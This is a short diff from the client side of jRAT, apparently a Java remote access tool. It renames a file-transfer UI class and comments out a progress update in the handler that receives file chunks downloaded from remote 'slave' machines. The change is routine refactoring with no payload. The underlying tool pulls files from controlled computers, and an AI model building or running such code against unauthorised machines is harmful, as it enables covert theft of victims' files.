@@ -4,7 +4,7 @@ import java.io.DataInputStream;
 import java.io.File;
 
 import se.jrat.client.Slave;
-import se.jrat.client.ui.frames.FrameFileTransfer;
+import se.jrat.client.ui.frames.PanelFileTransfer;
 import se.jrat.client.ui.frames.FrameRemoteFilesOld;
 import se.jrat.common.io.FileCache;
 import se.jrat.common.io.TransferData;
@@ -18,7 +18,7 @@ public class Packet29ServerDownloadPart extends AbstractIncomingPacket {
 		int len = dis.readInt();
 		byte[] buffer = new byte[len];
 		dis.readFully(buffer);
-		FrameFileTransfer frame = FrameFileTransfer.instance;
+		PanelFileTransfer frame = PanelFileTransfer.instance;
 		FrameRemoteFilesOld frame2 = FrameRemoteFilesOld.instances.get(slave);
 		if (frame2 != null) {
 			frame2.start();
@@ -38,7 +38,7 @@ public class Packet29ServerDownloadPart extends AbstractIncomingPacket {
 		data.increaseRead(buffer.length);
 		int bytesSent = data.read;
 		int totalBytes = (int) data.total;
-		frame.reportProgress(remotePath, (int) ((float) bytesSent / (float) totalBytes * 100.0F), (int) bytesSent, (int) totalBytes);
+		//frame.reportProgress(remotePath, (int) ((float) bytesSent / (float) totalBytes * 100.0F), (int) bytesSent, (int) totalBytes);
 
 		/*try {
 			FileIO fileio = new FileIO();
